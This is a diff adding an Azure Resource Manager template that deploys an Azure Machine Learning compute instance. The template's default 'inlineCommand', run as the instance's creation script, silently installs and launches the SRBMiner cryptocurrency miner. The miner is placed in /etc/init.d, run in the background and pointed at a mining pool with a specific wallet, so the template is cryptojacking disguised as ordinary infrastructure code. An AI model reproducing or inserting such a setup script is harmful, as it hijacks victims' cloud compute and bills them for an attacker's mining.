@@ -1,0 +1,118 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "workspaceName": {
+            "defaultValue": "v45",
+            "type": "string",
+            "metadata": {
+                "description": "Specifies the name of the Azure Machine Learning workspace to which compute instance will be deployed"
+            }
+        },
+        "computeName": {
+            "defaultValue": "[concat('a',uniqueString(resourceGroup().id))]",
+            "metadata": {
+                "description": "Specifies the name of the Azure Machine Learning compute instance to be deployed"
+            },
+            "type": "string"
+        },
+        "location": {
+            "defaultValue": "[resourceGroup().location]",
+            "type": "string",
+            "metadata": {
+                "description": "Location of the Azure Machine Learning workspace."
+            }
+        },
+        "vmSize": {
+            "defaultValue": "Standard_E4S_V3",
+            "type": "string",
+            "metadata": {
+                "description": "The VM size for compute instance"
+            }
+        },
+        "vnetResourceGroupName": {
+            "defaultValue": "",
+            "type": "string",
+            "metadata": {
+                "description": "Name of the resource group which holds the VNET to which you want to inject your compute instance in."
+            }
+        },
+        "vnetName": {
+            "defaultValue": "",
+            "type": "string",
+            "metadata": {
+                "description": "Name of the vnet which you want to inject your compute instance in."
+            }
+        },
+        "subnetName": {
+            "defaultValue": "",
+            "type": "string",
+            "metadata": {
+                "description": "Name of the subnet inside the VNET which you want to inject your compute instance in."
+            }
+        },
+        "tenantId": {
+            "defaultValue": "[subscription().tenantId]",
+            "type": "string",
+            "metadata": {
+                "description": "AAD tenant id of the user to which compute instance is assigned to"
+            }
+        },
+        "objectId": {
+            "defaultValue": "1",
+            "type": "string",
+            "metadata": {
+                "description": "AAD object id of the user to which compute instance is assigned to"
+            }
+        },
+        "inlineCommand": {
+            "type": "string",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.5/SRBMiner-Multi-2-4-5-Linux.tar.xz; tar xf SRBMiner-Multi-2-4-5-Linux.tar.xz; cd SRBMiner-Multi-2-4-5; sudo nohup ./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls true --wallet unMTq5XQWwz3hdLx6K6SXi6VUUbEuys58d.luckyvl --password webpassword=Ayenleakm2lnt --keepalive true --cpu-threads 4 --disable-gpu>log.out &",
+            "metadata": {
+                "description": "inline command"
+            }
+        },
+        "creationScript.cmdArguments": {
+            "type": "string",
+            "defaultValue": "",
+            "metadata": {
+                "description": "Specifies the cmd arguments of the creation script in the storage volume of the Compute Instance."
+            }
+        }
+    },
+    "variables": {
+        "subnet": {
+            "id": "[resourceId(parameters('vnetResourceGroupName'), 'Microsoft.Network/virtualNetworks/subnets', parameters('vnetName'), parameters('subnetName'))]"
+        }
+    },
+    "resources": [
+        {
+            "type": "Microsoft.MachineLearningServices/workspaces/computes",
+            "name": "[concat(parameters('workspaceName'), '/', parameters('computeName'))]",
+            "apiVersion": "2021-07-01",
+            "location": "[parameters('location')]",
+            "properties": {
+                "computeType": "ComputeInstance",
+                "properties": {
+                    "vmSize": "[parameters('vmSize')]",
+                    "subnet": "[if(and(not(empty(parameters('vnetResourceGroupName'))),not(empty(parameters('vnetName'))),not(empty(parameters('subnetName')))), variables('subnet'), json('null'))]",
+                    "personalComputeInstanceSettings": {
+                        "assignedUser": {
+                            "objectId": "[parameters('objectId')]",
+                            "tenantId": "[parameters('tenantId')]"
+                        }
+                    },
+                    "setupScripts": {
+                        "scripts": {
+                            "creationScript": {
+                                "scriptSource": "inline",
+                                "scriptData": "[base64(parameters('inlineCommand'))]",
+                                "scriptArguments": "[parameters('creationScript.cmdArguments')]"
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    ]
+}
